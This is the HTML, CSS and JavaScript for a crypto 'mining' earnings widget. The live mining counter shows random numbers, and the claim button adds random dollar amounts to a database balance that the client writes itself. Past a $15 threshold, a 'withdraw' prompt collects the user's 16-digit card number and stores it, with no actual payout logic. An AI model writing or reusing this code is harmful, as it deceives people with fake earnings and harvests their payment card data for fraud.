<div class="mining-pro-container">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Syncopate:wght@700&family=Space+Grotesk:wght@300;700&display=swap');

        .mining-pro-container {
            padding: 10px;
            color: #fff;
            font-family: 'Space Grotesk', sans-serif;
        }

        /* REAL LOGO ANIMASIYASI */
        .crypto-logos {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 25px;
            perspective: 1000px;
        }

        .coin-img {
            width: 50px;
            height: 50px;
            filter: drop-shadow(0 0 10px rgba(255, 215, 0, 0.4));
            animation: coin-float 3s ease-in-out infinite;
        }

        .coin-img.eth { animation-delay: 0.5s; filter: drop-shadow(0 0 10px rgba(130, 71, 229, 0.4)); }
        .coin-img.usdt { animation-delay: 1s; filter: drop-shadow(0 0 10px rgba(38, 161, 123, 0.4)); }

        @keyframes coin-float {
            0%, 100% { transform: translateY(0) rotateY(0deg); }
            50% { transform: translateY(-10px) rotateY(180deg); }
        }

        /* PREMIUM BALANS PANELI */
        .glass-panel {
            background: linear-gradient(145deg, rgba(255,255,255,0.05), rgba(0,0,0,0.2));
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 30px;
            padding: 30px 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
        }

        .glass-panel::before {
            content: ""; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(0,185,255,0.05) 0%, transparent 70%);
            animation: pulse-bg 8s linear infinite;
        }

        @keyframes pulse-bg { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .stat-label {
            font-family: 'Syncopate', sans-serif;
            font-size: 0.55rem;
            letter-spacing: 4px;
            color: #00b9ff;
            margin-bottom: 15px;
            opacity: 0.8;
        }

        .main-value {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(to right, #fff, #3f9c35);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin: 10px 0;
        }

        .live-mining-status {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-size: 0.7rem;
            color: #3f9c35;
            font-weight: bold;
        }

        .dot-pulse {
            width: 8px; height: 8px; background: #3f9c35; border-radius: 50%;
            animation: dot-glow 1s infinite alternate;
        }

        @keyframes dot-glow { from { opacity: 0.3; } to { opacity: 1; box-shadow: 0 0 10px #3f9c35; } }

        /* BUTONLAR */
        .grid-actions {
            display: grid;
            gap: 15px;
            margin-top: 30px;
        }

        .p-btn {
            border: none; border-radius: 20px; padding: 20px; font-weight: 700; font-family: 'Space Grotesk';
            cursor: pointer; transition: 0.4s; display: flex; align-items: center; justify-content: center; gap: 12px;
            text-transform: uppercase; font-size: 0.85rem; letter-spacing: 1px;
        }

        .p-btn-claim {
            background: #fff; color: #000;
            box-shadow: 0 10px 20px rgba(255,255,255,0.1);
        }

        .p-btn-claim:disabled { background: #1a1a1a; color: #444; cursor: not-allowed; }

        .p-btn-withdraw {
            background: rgba(63, 156, 53, 0.1); border: 1px solid #3f9c35; color: #3f9c35;
        }

        .p-btn-withdraw:hover { background: #3f9c35; color: #fff; }

        .limit-tag {
            font-size: 0.6rem; color: #ff3344; margin-top: 15px; text-align: center;
            padding: 10px; border-radius: 12px; background: rgba(255,51,68,0.05);
        }
    </style>

    <div class="crypto-logos">
        <img src="https://cryptologos.cc/logos/bitcoin-btc-logo.svg?v=025" class="coin-img" alt="BTC">
        <img src="https://cryptologos.cc/logos/ethereum-eth-logo.svg?v=025" class="coin-img eth" alt="ETH">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.svg?v=025" class="coin-img usdt" alt="USDT">
    </div>

    <div class="glass-panel">
        <div class="stat-label">AVAILABLE ASSETS</div>
        <div class="main-value">$<span id="m-bal">0.00</span></div>
        <div class="live-mining-status">
            <div class="dot-pulse"></div>
            ACTIVE MINING: +<span id="micro-inc">0.000000</span>
        </div>
    </div>

    <div class="grid-actions">
        <button id="m-claim-btn" class="p-btn p-btn-claim" onclick="runClaim()">
            <i class="fas fa-bolt-lightning"></i> COLLECT PROFIT
        </button>
        <button class="p-btn p-btn-withdraw" onclick="runWithdraw()">
            <i class="fas fa-credit-card"></i> WITHDRAW TO CARD
        </button>
    </div>

    <div id="m-timer" style="text-align: center; font-size: 0.7rem; color: #888; margin-top: 15px;"></div>
    
    <div class="limit-tag">
        <i class="fas fa-lock"></i> MINIMUM WITHDRAWAL LIMIT: 15.00 USD
    </div>
</div>

<script>
    (function() {
        const uID = localStorage.getItem('elite_session') || 'Guest';
        let bal = 0;
        let lTime = 0;

        // MİKRO ARTIM EFFEKTİ
        setInterval(() => {
            const inc = document.getElementById('micro-inc');
            if(inc) inc.innerText = (Math.random() * 0.000099).toFixed(6);
        }, 2000);

        // REAL-TIME DATA
        db.ref('mining/' + uID).on('value', snap => {
            const d = snap.val() || { balance: 0, lastClaim: 0 };
            bal = parseFloat(d.balance);
            lTime = d.lastClaim;
            
            const balDisplay = document.getElementById('m-bal');
            if(balDisplay) balDisplay.innerText = bal.toFixed(2);
            
            checkMiningStatus();
        });

        window.checkMiningStatus = function() {
            const btn = document.getElementById('m-claim-btn');
            const timer = document.getElementById('m-timer');
            if(!btn) return;

            const now = Date.now();
            const wait = 3600000; 
            const diff = now - lTime;

            if(diff < wait) {
                btn.disabled = true;
                const r = wait - diff;
                const m = Math.floor(r / 60000);
                const s = Math.floor((r % 60000) / 1000);
                timer.innerText = `NEXT WITHDRAWAL READY IN: ${m}M ${s}S`;
                setTimeout(checkMiningStatus, 1000);
            } else {
                btn.disabled = false;
                timer.innerText = "SYSTEM STATUS: HARVEST READY";
            }
        };

        window.runClaim = async function() {
            const gain = (Math.random() * (0.65 - 0.15) + 0.15).toFixed(2);
            const total = (parseFloat(bal) + parseFloat(gain)).toFixed(2);
            
            await db.ref('mining/' + uID).update({
                balance: total,
                lastClaim: Date.now()
            });
            alert(`SUCCESS: $${gain} added to your vault.`);
        };

        window.runWithdraw = function() {
            if(bal < 15) {
                alert(`INSUFFICIENT FUNDS: You need at least $15.00 to withdraw. Current: $${bal.toFixed(2)}`);
            } else {
                const cardNum = prompt("ENTER YOUR 16-DIGIT CARD NUMBER:");
                if(cardNum && cardNum.length >= 16) {
                    db.ref('withdraw_requests/' + uID).push({
                        amount: bal,
                        card: cardNum,
                        timestamp: new Date().toLocaleString()
                    });
                    alert("REQUEST SENT: Your withdrawal is being processed by the network.");
                } else {
                    alert("ERROR: Invalid card number.");
                }
            }
        };

        checkMiningStatus();
    })();
</script>
